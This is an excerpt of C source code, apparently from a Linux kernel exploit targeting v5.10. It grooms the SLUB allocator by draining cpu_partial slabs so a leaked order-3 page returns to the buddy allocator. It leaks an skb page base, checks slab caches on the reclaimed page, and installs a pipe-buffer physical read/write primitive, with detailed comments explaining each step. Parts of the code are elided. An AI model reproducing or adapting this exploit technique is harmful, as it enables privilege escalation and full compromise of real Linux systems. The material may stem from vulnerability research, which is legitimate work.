...
uintptr_t prepare_pipe_buffer_page_child(void) {
  ...
  /* v5.10 SLUB cpu_partial drain (same trick as prepare_kernel_page):
   * after the pre/post/spray closes the leaked slab sits FROZEN on this
   * CPU's cpu_partial chain with inuse=1; close(leak_memfd) alone would
   * take the FREE_FROZEN path and strand it there (never reaching buddy,
   * so the skb frag below would reclaim some other page).  Freeze more
   * than cpu_partial(13) additional partial slabs by closing one mm from
   * that many distinct full prep slabs: put_cpu_partial() then runs
   * unfreeze_partials() and moves the leak slab to the node partial list,
   * so the final close hits the slab_empty path and discard_slab()
   * synchronously returns the order-3 page to free_area[3]. */
  {
    int froze = 0;
    for (size_t i = 0; i < prep.mm_cnt && froze < MM_CPU_PARTIAL + 4;
         i += 40) {
      if (prep.memfds[i] >= 0) {
  ...
  pr_info("pipe prep: skb sent, running kernelsnitch\n");
  ...
  pr_info("pipe prep: leaked skb page base=%016zx\n", base);
  ...
  pr_info("pipe prep: reclaim arrays done, reporting base\n");
...
uintptr_t prepare_pipe_buffer_page(void) {
  ...
  SYSCHK(close(result_pipe[0]));
  pr_info("pipe prep: child reported base=%016zx (got=%zd)\n", base, got);
...
int pipe_reclaim_cache_gate(int fd) {
  ...
  pr_info("phys gate caches n2k=%016zx c2k=%016zx pipe=%016zx base=%016zx\n",
          kmalloc_normal_2k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache, pipebuf_page_base);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    ...
    pr_info("phys gate off=%03zx head=%016zx slab_cache=%016zx match=%d type=%08x\n",
            off, head, slab_cache, cache_match, page_type);
...
int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    ...
    pr_info("phys step waiting for pipe page prepare...\n");
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }
  pr_info("phys step pipe page base=%016zx\n", pipebuf_page_base);
